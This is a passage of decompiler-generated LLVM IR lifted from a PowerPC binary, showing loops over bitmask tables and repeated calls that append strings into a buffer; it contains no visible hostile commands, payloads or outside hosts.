  store i32 4, i32* @r4, align 4
  %v0_100006f8 = load i32, i32* @r31, align 4
  store i32 %v0_100006f8, i32* %r3.global-to-local, align 4
  store i32 268437252, i32* @lr, align 4
  %v2_10000700 = call i32 @function_1000b2c0(i32 %v0_100006f8)
  store i32 %v2_10000700, i32* %r3.global-to-local, align 4
  %v0_10000704 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000704 = inttoptr i32 %v0_10000704 to i32*
  %v2_10000704 = load i32, i32* %v1_10000704, align 4
  store i32 %v2_10000704, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 65535, i32* %r11.global-to-local, align 4
  %v0_10000718 = load i32, i32* %r18.global-to-local, align 4
  %v1_10000720 = load i32, i32* @r1, align 4
  %v2_10000720 = add i32 %v1_10000720, 8
  %v3_10000720 = inttoptr i32 %v2_10000720 to i32*
  store i32 65535, i32* %v3_10000720, align 4
  store i32 268437288, i32* @lr, align 4
  %v5_10000724 = call i32 @function_1000c180(i32 %v2_10000704, i32 0, i32 8, i32 %v0_10000718, i32 4)
  store i32 %v5_10000724, i32* %r3.global-to-local, align 4
  %v0_10000728 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000728 = add i32 %v0_10000728, 16
  %v2_10000728 = inttoptr i32 %v1_10000728 to i32*
  %v3_10000728 = load i32, i32* %v2_10000728, align 4
  store i32 %v3_10000728, i32* %r9.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_10000730 = inttoptr i32 %v0_10000728 to i32*
  %v2_10000730 = load i32, i32* %v1_10000730, align 4
  store i32 %v2_10000730, i32* @r3, align 4
  %v0_10000734 = load i32, i32* @r1, align 4
  %v1_10000734 = add i32 %v0_10000734, 28
  store i32 %v1_10000734, i32* %r4.global-to-local, align 4
  %v2_10000738 = add i32 %v0_10000734, 32
  %v3_10000738 = inttoptr i32 %v2_10000738 to i32*
  store i32 %v3_10000728, i32* %v3_10000738, align 4
  %v0_10000740 = load i32, i32* %r0.global-to-local, align 4
  %v1_10000740 = trunc i32 %v0_10000740 to i8
  %v2_10000740 = load i32, i32* %r30.global-to-local, align 4
  %v3_10000740 = add i32 %v2_10000740, 4
  %v4_10000740 = inttoptr i32 %v3_10000740 to i8*
  store i8 %v1_10000740, i8* %v4_10000740, align 1
  %v0_10000744 = load i32, i32* %r25.global-to-local, align 4
  %v1_10000744 = load i32, i32* %r30.global-to-local, align 4
  %v2_10000744 = add i32 %v1_10000744, 8
  %v3_10000744 = inttoptr i32 %v2_10000744 to i32*
  store i32 %v0_10000744, i32* %v3_10000744, align 4
  %v0_10000748 = load i32, i32* %r0.global-to-local, align 4
  %v1_10000748 = trunc i32 %v0_10000748 to i16
  %v2_10000748 = load i32, i32* @r1, align 4
  %v3_10000748 = add i32 %v2_10000748, 28
  %v4_10000748 = inttoptr i32 %v3_10000748 to i16*
  store i16 %v1_10000748, i16* %v4_10000748, align 2
  %v0_1000074c = load i32, i32* @r1, align 4
  %v1_1000074c = add i32 %v0_1000074c, 20800
  %v2_1000074c = inttoptr i32 %v1_1000074c to i32*
  %v3_1000074c = load i32, i32* %v2_1000074c, align 4
  store i32 %v3_1000074c, i32* %r0.global-to-local, align 4
  %v1_10000750 = trunc i32 %v3_1000074c to i16
  %v3_10000750 = add i32 %v0_1000074c, 30
  %v4_10000750 = inttoptr i32 %v3_10000750 to i16*
  store i16 %v1_10000750, i16* %v4_10000750, align 2
  store i32 268437336, i32* @lr, align 4
  %v0_10000754 = call i32 @function_1000bfbc()
  store i32 %v0_10000754, i32* %r3.global-to-local, align 4
  %v0_10000758.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10000758

dec_label_pc_10000758:                            ; preds = %dec_label_pc_10000c94, %dec_label_pc_100006e0
  %v0_10000758 = phi i32 [ %v2_10000c8c, %dec_label_pc_10000c94 ], [ %v0_10000758.pre, %dec_label_pc_100006e0 ]
  %v1_10000758 = inttoptr i32 %v0_10000758 to i32*
  %v2_10000758 = load i32, i32* %v1_10000758, align 4
  %v1_1000075c = call i32 @__asm_rlwinm(i32 %v2_10000758, i32 29, i32 3, i32 29)
  %v0_10000760 = load i32, i32* %r26.global-to-local, align 4
  %v2_10000760 = icmp slt i32 %v0_10000760, %v2_10000758
  %v3_10000760 = icmp sgt i32 %v0_10000760, %v2_10000758
  %v4_10000760 = icmp eq i32 %v0_10000760, %v2_10000758
  store i1 %v2_10000760, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000760, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10000760, i1* %cr7_eq.global-to-local, align 1
  %v1_10000764 = load i32, i32* %r18.global-to-local, align 4
  %v2_10000764 = add i32 %v1_10000764, %v1_1000075c
  store i32 %v2_10000764, i32* %r11.global-to-local, align 4
  %v1_10000768 = urem i32 %v2_10000758, 32
  store i32 %v1_10000768, i32* %r0.global-to-local, align 4
  %v1_1000076c = add i32 %v2_10000764, 164
  %v2_1000076c = inttoptr i32 %v1_1000076c to i32*
  %v3_1000076c = load i32, i32* %v2_1000076c, align 4
  %v0_10000770 = load i32, i32* %r23.global-to-local, align 4
  %v3_10000770 = shl i32 %v0_10000770, %v1_10000768
  store i32 %v3_10000770, i32* %r0.global-to-local, align 4
  %v2_10000774 = or i32 %v3_10000770, %v3_1000076c
  store i32 %v2_10000774, i32* %r9.global-to-local, align 4
  store i32 %v2_10000774, i32* %v2_1000076c, align 4
  br i1 %v2_10000760, label %dec_label_pc_10000780, label %dec_label_pc_10000678

dec_label_pc_10000780:                            ; preds = %dec_label_pc_10000758
  %v1_10000780 = add i32 %v2_10000758, 1
  store i32 %v1_10000780, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10000784

dec_label_pc_10000784:                            ; preds = %dec_label_pc_10000c84, %dec_label_pc_10000c54, %dec_label_pc_10000780
  %v0_1000079426 = phi i32 [ %v1_10000c84, %dec_label_pc_10000c84 ], [ %v1_10000c54, %dec_label_pc_10000c54 ], [ %v1_10000780, %dec_label_pc_10000780 ]
  %v0_10000784 = load i32, i32* %r28.global-to-local, align 4
  %v1_10000784 = add i32 %v0_10000784, 1
  store i32 %v1_10000784, i32* %r28.global-to-local, align 4
  %v0_10000788 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000788 = add i32 %v0_10000788, 3140
  store i32 %v1_10000788, i32* %r30.global-to-local, align 4
  %v0_1000078c = load i32, i32* %r21.global-to-local, align 4
  %v2_1000078c = icmp slt i32 %v0_1000078c, %v1_10000784
  %v3_1000078c = icmp sgt i32 %v0_1000078c, %v1_10000784
  %v4_1000078c = icmp eq i32 %v0_1000078c, %v1_10000784
  store i1 %v2_1000078c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000078c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_1000078c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000078c, label %dec_label_pc_10000794, label %dec_label_pc_10000688

dec_label_pc_10000794:                            ; preds = %dec_label_pc_10000784, %dec_label_pc_10000678.dec_label_pc_10000794_crit_edge
  %v0_100007b4 = phi i32 [ %v0_10000794.pre, %dec_label_pc_10000678.dec_label_pc_10000794_crit_edge ], [ %v0_1000079426, %dec_label_pc_10000784 ]
  %v1_10000794 = icmp slt i32 %v0_100007b4, 0
  %v2_10000794 = icmp sgt i32 %v0_100007b4, 0
  %v3_10000794 = icmp eq i32 %v0_100007b4, 0
  store i1 %v1_10000794, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000794, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000794, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000794, label %dec_label_pc_100005c4, label %dec_label_pc_1000079c

dec_label_pc_1000079c:                            ; preds = %dec_label_pc_10000794
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  %v0_100007a4 = load i32, i32* @r1, align 4
  %v1_100007a4 = add i32 %v0_100007a4, 44
  store i32 %v1_100007a4, i32* %r4.global-to-local, align 4
  %v1_100007a8 = add i32 %v0_100007a4, 172
  %v1_100007b0 = add i32 %v0_100007a4, 20
  store i32 %v0_100007b4, i32* %r3.global-to-local, align 4
  %v2_100007b8 = add i32 %v0_100007a4, 24
  %v3_100007b8 = inttoptr i32 %v2_100007b8 to i32*
  store i32 0, i32* %v3_100007b8, align 4
  %v0_100007bc = load i32, i32* %r9.global-to-local, align 4
  %v1_100007bc = load i32, i32* @r1, align 4
  %v2_100007bc = add i32 %v1_100007bc, 20
  %v3_100007bc = inttoptr i32 %v2_100007bc to i32*
  store i32 %v0_100007bc, i32* %v3_100007bc, align 4
  store i32 268437444, i32* @lr, align 4
  %v5_100007c0 = call i32 @function_1000b6b8(i32 %v0_100007b4, i32 %v1_100007a4, i32 %v1_100007a8, i32 0, i32 %v1_100007b0)
  store i32 %v5_100007c0, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268437456, i32* @lr, align 4
  %v0_100007cc = call i32 @function_1000b7c0()
  store i32 %v0_100007cc, i32* %r3.global-to-local, align 4
  %v0_100007d0 = load i32, i32* %r29.global-to-local, align 4
  %v1_100007d0 = icmp slt i32 %v0_100007d0, 0
  %v2_100007d0 = icmp sgt i32 %v0_100007d0, 0
  %v3_100007d0 = icmp eq i32 %v0_100007d0, 0
  store i1 %v1_100007d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100007d0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100007d0, i1* %cr7_eq.global-to-local, align 1
  %v1_100007d4 = load i32, i32* @r1, align 4
  %v2_100007d4 = add i32 %v1_100007d4, 20792
  %v3_100007d4 = inttoptr i32 %v2_100007d4 to i32*
  store i32 %v0_100007cc, i32* %v3_100007d4, align 4
  %tmp68 = icmp slt i32 %v0_100007d0, 1
  br i1 %tmp68, label %dec_label_pc_100005c4, label %dec_label_pc_100007dc

dec_label_pc_100007dc:                            ; preds = %dec_label_pc_1000079c
  %v0_100007dc = load i32, i32* @r1, align 4
  %v1_100007dc = add i32 %v0_100007dc, 20796
  %v2_100007dc = inttoptr i32 %v1_100007dc to i32*
  %v3_100007dc = load i32, i32* %v2_100007dc, align 4
  store i32 %v3_100007dc, i32* %r23.global-to-local, align 4
  store i32 0, i32* %r19.global-to-local, align 4
  %v1_100007e4 = add i32 %v3_100007dc, 533
  store i32 %v1_100007e4, i32* @r30, align 4
  br label %dec_label_pc_10000838

dec_label_pc_100007ec:                            ; preds = %dec_label_pc_10000844, %dec_label_pc_10000890
  %v0_100007ec = phi i32 [ %v0_10000848, %dec_label_pc_10000844 ], [ %v0_100007ec.pre, %dec_label_pc_10000890 ]
  %v1_100007ec = call i32 @__asm_rlwinm(i32 %v0_100007ec, i32 29, i32 3, i32 29)
  %v0_100007f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_100007f0 = urem i32 %v0_100007f0, 32
  store i32 %v1_100007f0, i32* %r11.global-to-local, align 4
  %v1_100007f4 = load i32, i32* %r18.global-to-local, align 4
  %v2_100007f4 = add i32 %v1_100007f4, %v1_100007ec
  store i32 %v2_100007f4, i32* %r9.global-to-local, align 4
  %v1_100007f8 = add i32 %v2_100007f4, 36
  %v2_100007f8 = inttoptr i32 %v1_100007f8 to i32*
  %v3_100007f8 = load i32, i32* %v2_100007f8, align 4
  %v3_100007fc = lshr i32 %v3_100007f8, %v1_100007f0
  store i32 %v3_100007fc, i32* %r0.global-to-local, align 4
  %v1_10000800 = urem i32 %v3_100007fc, 2
  store i32 %v1_10000800, i32* %r9.global-to-local, align 4
  %v3_10000800 = icmp eq i32 %v1_10000800, 0
  br i1 %v3_10000800, label %dec_label_pc_10000824, label %dec_label_pc_10000808

dec_label_pc_10000808:                            ; preds = %dec_label_pc_100007ec
  %v0_10000808 = load i32, i32* @r30, align 4
  %v1_10000808 = add i32 %v0_10000808, -529
  %v2_10000808 = inttoptr i32 %v1_10000808 to i8*
  %v3_10000808 = load i8, i8* %v2_10000808, align 1
  %v4_10000808 = zext i8 %v3_10000808 to i32
  store i32 %v4_10000808, i32* %r0.global-to-local, align 4
  %v1_1000080c = icmp ult i8 %v3_10000808, 6
  %v2_1000080c = icmp ugt i8 %v3_10000808, 6
  %v3_1000080c = icmp eq i8 %v3_10000808, 6
  store i1 %v1_1000080c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000080c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000080c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000080c, label %dec_label_pc_10000ca8, label %dec_label_pc_10000814

dec_label_pc_10000814:                            ; preds = %dec_label_pc_10000808
  %v1_10000814 = icmp ult i8 %v3_10000808, 7
  %v2_10000814 = icmp ugt i8 %v3_10000808, 7
  %v3_10000814 = icmp eq i8 %v3_10000808, 7
  store i1 %v1_10000814, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000814, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000814, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000814, label %dec_label_pc_10001294, label %dec_label_pc_1000081c

dec_label_pc_1000081c:                            ; preds = %dec_label_pc_10000814
  %v1_1000081c = icmp ult i8 %v3_10000808, 10
  %v2_1000081c = icmp ugt i8 %v3_10000808, 10
  %v3_1000081c = icmp eq i8 %v3_10000808, 10
  store i1 %v1_1000081c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000081c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000081c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000081c, label %dec_label_pc_10001518, label %dec_label_pc_10000824

dec_label_pc_10000824:                            ; preds = %dec_label_pc_100017ec, %dec_label_pc_100013b0, %dec_label_pc_1000190c, %dec_label_pc_100017d4, %dec_label_pc_1000081c, %dec_label_pc_100007ec, %dec_label_pc_10000838, %dec_label_pc_100019ac, %dec_label_pc_100018f0, %dec_label_pc_100017bc, %dec_label_pc_10001758, %dec_label_pc_10001558, %dec_label_pc_100014f0, %dec_label_pc_10001414, %dec_label_pc_100011e4, %dec_label_pc_10001b70
  %v0_10000824 = load i32, i32* %r19.global-to-local, align 4
  %v1_10000824 = add i32 %v0_10000824, 1
  store i32 %v1_10000824, i32* %r19.global-to-local, align 4
  %v0_10000828 = load i32, i32* %r23.global-to-local, align 4
  %v1_10000828 = add i32 %v0_10000828, 3140
  store i32 %v1_10000828, i32* %r23.global-to-local, align 4
  %v1_1000082c = load i32, i32* %r21.global-to-local, align 4
  %v2_1000082c = icmp slt i32 %v1_10000824, %v1_1000082c
  %v3_1000082c = icmp sgt i32 %v1_10000824, %v1_1000082c
  %v4_1000082c = icmp eq i32 %v1_10000824, %v1_1000082c
  store i1 %v2_1000082c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000082c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_1000082c, i1* %cr7_eq.global-to-local, align 1
  %v0_10000830 = load i32, i32* @r30, align 4
  %v1_10000830 = add i32 %v0_10000830, 3140
  store i32 %v1_10000830, i32* @r30, align 4
  br i1 %v4_1000082c, label %dec_label_pc_100005c4, label %dec_label_pc_10000838

dec_label_pc_10000838:                            ; preds = %dec_label_pc_10000824, %dec_label_pc_100007dc
  %v0_10000838 = phi i32 [ %v1_10000830, %dec_label_pc_10000824 ], [ %v1_100007e4, %dec_label_pc_100007dc ]
  %v1_10000838 = add i32 %v0_10000838, -533
  %v2_10000838 = inttoptr i32 %v1_10000838 to i32*
  %v3_10000838 = load i32, i32* %v2_10000838, align 4
  store i32 %v3_10000838, i32* %r3.global-to-local, align 4
  %v1_1000083c = icmp slt i32 %v3_10000838, -1
  %v2_1000083c = icmp sgt i32 %v3_10000838, -1
  %v3_1000083c = icmp eq i32 %v3_10000838, -1
  store i1 %v1_1000083c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000083c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000083c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000083c, label %dec_label_pc_10000824, label %dec_label_pc_10000844

dec_label_pc_10000844:                            ; preds = %dec_label_pc_10000838
  %v1_10000844 = call i32 @__asm_rlwinm(i32 %v3_10000838, i32 29, i32 3, i32 29)
  %v0_10000848 = load i32, i32* %r3.global-to-local, align 4
  %v1_10000848 = urem i32 %v0_10000848, 32
  store i32 %v1_10000848, i32* %r11.global-to-local, align 4
  %v1_1000084c = load i32, i32* %r18.global-to-local, align 4
  %v2_1000084c = add i32 %v1_1000084c, %v1_10000844
  store i32 %v2_1000084c, i32* %r9.global-to-local, align 4
  %v1_10000850 = add i32 %v2_1000084c, 164
  %v2_10000850 = inttoptr i32 %v1_10000850 to i32*
  %v3_10000850 = load i32, i32* %v2_10000850, align 4
  %v3_10000854 = lshr i32 %v3_10000850, %v1_10000848
  store i32 %v3_10000854, i32* %r0.global-to-local, align 4
  %v1_10000858 = urem i32 %v3_10000854, 2
  store i32 %v1_10000858, i32* %r9.global-to-local, align 4
  %v3_10000858 = icmp eq i32 %v1_10000858, 0
  br i1 %v3_10000858, label %dec_label_pc_100007ec, label %dec_label_pc_10000860

dec_label_pc_10000860:                            ; preds = %dec_label_pc_10000844
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 4, i32* @r31, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v0_10000870 = load i32, i32* @r1, align 4
  %v1_10000870 = add i32 %v0_10000870, 12
  %v1_10000874 = add i32 %v0_10000870, 16
  %v3_10000878 = inttoptr i32 %v1_10000870 to i32*
  store i32 0, i32* %v3_10000878, align 4
  %v0_1000087c = load i32, i32* @r31, align 4
  %v1_1000087c = load i32, i32* @r1, align 4
  %v2_1000087c = add i32 %v1_1000087c, 16
  %v3_1000087c = inttoptr i32 %v2_1000087c to i32*
  store i32 %v0_1000087c, i32* %v3_1000087c, align 4
  store i32 268437636, i32* @lr, align 4
  %v5_10000880 = call i32 @function_1000c024(i32 1, i32 4, i32 %v1_10000870, i32 %v1_10000874, i32 %v1_10000858)
  store i32 %v5_10000880, i32* %r3.global-to-local, align 4
  %v0_10000884 = load i32, i32* @r1, align 4
  %v1_10000884 = add i32 %v0_10000884, 12
  %v2_10000884 = inttoptr i32 %v1_10000884 to i32*
  %v3_10000884 = load i32, i32* %v2_10000884, align 4
  store i32 %v3_10000884, i32* %r0.global-to-local, align 4
  %v2_10000888 = or i32 %v3_10000884, %v5_10000880
  store i32 %v2_10000888, i32* %r9.global-to-local, align 4
  %v5_10000888 = icmp eq i32 %v2_10000888, 0
  %v0_10000890 = load i32, i32* @r30, align 4
  %v1_10000890 = add i32 %v0_10000890, -533
  %v2_10000890 = inttoptr i32 %v1_10000890 to i32*
  %v3_10000890 = load i32, i32* %v2_10000890, align 4
  store i32 %v3_10000890, i32* %r3.global-to-local, align 4
  br i1 %v5_10000888, label %dec_label_pc_10000890, label %dec_label_pc_100014f0

dec_label_pc_10000890:                            ; preds = %dec_label_pc_10000860
  %v0_10000894 = load i32, i32* @r31, align 4
  %v1_10000894 = trunc i32 %v0_10000894 to i8
  %v3_10000894 = add i32 %v0_10000890, -529
  %v4_10000894 = inttoptr i32 %v3_10000894 to i8*
  store i8 %v1_10000894, i8* %v4_10000894, align 1
  %v0_100007ec.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100007ec

dec_label_pc_1000089c:                            ; preds = %dec_label_pc_10000688
  %v1_1000089c = add i32 %v2_10000c8c, 1456
  %v2_1000089c = inttoptr i32 %v1_1000089c to i32*
  %v3_1000089c = load i32, i32* %v2_1000089c, align 4
  store i32 %v3_1000089c, i32* %r0.global-to-local, align 4
  %v1_100008a0 = icmp slt i32 %v3_1000089c, 0
  %v2_100008a0 = icmp sgt i32 %v3_1000089c, 0
  %v3_100008a0 = icmp eq i32 %v3_1000089c, 0
  store i1 %v1_100008a0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100008a0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100008a0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100008a0, label %dec_label_pc_10000c8c, label %dec_label_pc_100008a8

dec_label_pc_100008a8:                            ; preds = %dec_label_pc_1000089c
  store i32 4, i32* %r0.global-to-local, align 4
  store i8 4, i8* %v2_10000688, align 1
  %v1_100008b4.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100008b0

dec_label_pc_100008b0:                            ; preds = %dec_label_pc_10000648, %dec_label_pc_100008a8
  %v1_100008b4 = phi i32 [ %v2_10000c8c, %dec_label_pc_10000648 ], [ %v1_100008b4.pre, %dec_label_pc_100008a8 ]
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_100008b4 = load i32, i32* %r19.global-to-local, align 4
  %v2_100008b4 = add i32 %v1_100008b4, 1464
  %v3_100008b4 = inttoptr i32 %v2_100008b4 to i32*
  store i32 %v0_100008b4, i32* %v3_100008b4, align 4
  %v0_100008b8 = load i32, i32* %r29.global-to-local, align 4
  %v1_100008b8 = load i32, i32* %r30.global-to-local, align 4
  %v2_100008b8 = add i32 %v1_100008b8, 1452
  %v3_100008b8 = inttoptr i32 %v2_100008b8 to i32*
  store i32 %v0_100008b8, i32* %v3_100008b8, align 4
  %v0_100008bc = load i32, i32* %r30.global-to-local, align 4
  %v1_100008bc = add i32 %v0_100008bc, 2116
  store i32 %v1_100008bc, i32* @r3, align 4
  store i32 1024, i32* @r4, align 4
  %v1_100008c4 = add i32 %v0_100008bc, 1431
  store i32 %v1_100008c4, i32* %r27.global-to-local, align 4
  store i32 268437708, i32* @lr, align 4
  %v0_100008c8 = call i32 @function_1000ac0c()
  %v0_100008cc = load i32, i32* %r29.global-to-local, align 4
  %v1_100008cc = load i32, i32* %r30.global-to-local, align 4
  %v2_100008cc = add i32 %v1_100008cc, 2112
  %v3_100008cc = inttoptr i32 %v2_100008cc to i32*
  store i32 %v0_100008cc, i32* %v3_100008cc, align 4
  store i32 10240, i32* @r4, align 4
  %v0_100008d4 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_100008d4, i32* @r3, align 4
  store i32 268437724, i32* @lr, align 4
  %v0_100008d8 = call i32 @function_1000ac0c()
  %v0_100008dc = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_100008dc, i32* %r3.global-to-local, align 4
  store i32 268437732, i32* @lr, align 4
  %v1_100008e0 = inttoptr i32 %v0_100008dc to i8*
  %v2_100008e0 = call i32 @function_1000ab64(i8* %v1_100008e0)
  %v0_100008e4 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100008e4, i32* %r4.global-to-local, align 4
  %v0_100008e8 = load i32, i32* %r22.global-to-local, align 4
  %v2_100008e8 = add i32 %v0_100008e8, %v2_100008e0
  store i32 %v2_100008e8, i32* @r3, align 4
  store i32 268437744, i32* %lr.global-to-local, align 4
  %v2_100008ec = inttoptr i32 %v2_100008e8 to i8*
  %v3_100008ec = call i32 @function_1000ab8c(i8* %v2_100008ec, i32 %v0_100008e4)
  %v0_100008f0 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_100008f0, i32* %r3.global-to-local, align 4
  store i32 268437752, i32* @lr, align 4
  %v1_100008f4 = inttoptr i32 %v0_100008f0 to i8*
  %v2_100008f4 = call i32 @function_1000ab64(i8* %v1_100008f4)
  %v0_100008f8 = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_100008f8, i32* %r4.global-to-local, align 4
  %v0_100008fc = load i32, i32* %r22.global-to-local, align 4
  %v2_100008fc = add i32 %v0_100008fc, %v2_100008f4
  store i32 %v2_100008fc, i32* @r3, align 4
  store i32 268437764, i32* %lr.global-to-local, align 4
  %v2_10000900 = inttoptr i32 %v2_100008fc to i8*
  %v3_10000900 = call i32 @function_1000ab8c(i8* %v2_10000900, i32 %v0_100008f8)
  %v0_10000904 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000904, i32* %r3.global-to-local, align 4
  store i32 268437772, i32* @lr, align 4
  %v1_10000908 = inttoptr i32 %v0_10000904 to i8*
  %v2_10000908 = call i32 @function_1000ab64(i8* %v1_10000908)
  %v0_1000090c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000090c = add i32 %v0_1000090c, 532
  store i32 %v1_1000090c, i32* %r4.global-to-local, align 4
  %v0_10000910 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000910 = add i32 %v0_10000910, %v2_10000908
  store i32 %v2_10000910, i32* @r3, align 4
  store i32 268437784, i32* %lr.global-to-local, align 4
  %v2_10000914 = inttoptr i32 %v2_10000910 to i8*
  %v3_10000914 = call i32 @function_1000ab8c(i8* %v2_10000914, i32 %v1_1000090c)
  %v0_10000918 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000918, i32* %r3.global-to-local, align 4
  store i32 268437792, i32* @lr, align 4
  %v1_1000091c = inttoptr i32 %v0_10000918 to i8*
  %v2_1000091c = call i32 @function_1000ab64(i8* %v1_1000091c)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1000de10.26 to i32), i32* %r4.global-to-local, align 4
  %v0_10000928 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000928 = add i32 %v0_10000928, %v2_1000091c
  store i32 %v2_10000928, i32* @r3, align 4
  store i32 268437808, i32* %lr.global-to-local, align 4
  %v3_1000092c = inttoptr i32 %v2_10000928 to i8*
  %v4_1000092c = call i32 @function_1000ab8c(i8* %v3_1000092c, i32 ptrtoint ([24 x i8]* @global_var_1000de10.26 to i32))
  %v0_10000930 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000930, i32* %r3.global-to-local, align 4
  store i32 268437816, i32* @lr, align 4
  %v1_10000934 = inttoptr i32 %v0_10000930 to i8*
  %v2_10000934 = call i32 @function_1000ab64(i8* %v1_10000934)
  %v0_10000938 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000938 = add i32 %v0_10000938, 20
  store i32 %v1_10000938, i32* %r4.global-to-local, align 4
  %v0_1000093c = load i32, i32* %r22.global-to-local, align 4
  %v2_1000093c = add i32 %v0_1000093c, %v2_10000934
  store i32 %v2_1000093c, i32* @r3, align 4
  store i32 268437828, i32* %lr.global-to-local, align 4
  %v2_10000940 = inttoptr i32 %v2_1000093c to i8*
  %v3_10000940 = call i32 @function_1000ab8c(i8* %v2_10000940, i32 %v1_10000938)
  %v0_10000944 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000944, i32* %r3.global-to-local, align 4
  store i32 268437836, i32* @lr, align 4
  %v1_10000948 = inttoptr i32 %v0_10000944 to i8*
  %v2_10000948 = call i32 @function_1000ab64(i8* %v1_10000948)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1000de28.27 to i32), i32* %r4.global-to-local, align 4
  %v0_10000954 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000954 = add i32 %v0_10000954, %v2_10000948
  store i32 %v2_10000954, i32* @r3, align 4
  store i32 268437852, i32* %lr.global-to-local, align 4
  %v3_10000958 = inttoptr i32 %v2_10000954 to i8*
  %v4_10000958 = call i32 @function_1000ab8c(i8* %v3_10000958, i32 ptrtoint ([9 x i8]* @global_var_1000de28.27 to i32))
  %v0_1000095c = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_1000095c, i32* %r3.global-to-local, align 4
  store i32 268437860, i32* @lr, align 4
  %v1_10000960 = inttoptr i32 %v0_1000095c to i8*
  %v2_10000960 = call i32 @function_1000ab64(i8* %v1_10000960)
  %v0_10000964 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000964 = add i32 %v0_10000964, 789
  store i32 %v1_10000964, i32* %r4.global-to-local, align 4
  %v0_10000968 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000968 = add i32 %v0_10000968, %v2_10000960
  store i32 %v2_10000968, i32* @r3, align 4
  store i32 268437872, i32* %lr.global-to-local, align 4
  %v2_1000096c = inttoptr i32 %v2_10000968 to i8*
  %v3_1000096c = call i32 @function_1000ab8c(i8* %v2_1000096c, i32 %v1_10000964)
  %v0_10000970 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000970, i32* %r3.global-to-local, align 4
  store i32 268437880, i32* @lr, align 4
  %v1_10000974 = inttoptr i32 %v0_10000970 to i8*
  %v2_10000974 = call i32 @function_1000ab64(i8* %v1_10000974)
  %v0_10000978 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000978, i32* %r4.global-to-local, align 4
  %v0_1000097c = load i32, i32* %r22.global-to-local, align 4
  %v2_1000097c = add i32 %v0_1000097c, %v2_10000974
  store i32 %v2_1000097c, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000984.28 to i32), i32* %lr.global-to-local, align 4
  %v3_10000980 = inttoptr i32 %v2_1000097c to i8*
  %v4_10000980 = call i32 @function_1000ab8c(i8* %v3_10000980, i32 %v0_10000978)
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 268437900, i32* @lr, align 4
  %v1_10000988 = call i32 @function_1000a2ec(i32 32)
  %v0_1000098c = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_1000098c, i32* %r3.global-to-local, align 4
  store i32 268437908, i32* @lr, align 4
  %v1_10000990 = inttoptr i32 %v0_1000098c to i8*
  %v2_10000990 = call i32 @function_1000ab64(i8* %v1_10000990)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_10000990, i32* %r29.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 268437924, i32* %lr.global-to-local, align 4
  %v3_100009a0 = call i32 @function_1000a238(i32 32, i32* null)
  store i32 %v3_100009a0, i32* %r4.global-to-local, align 4
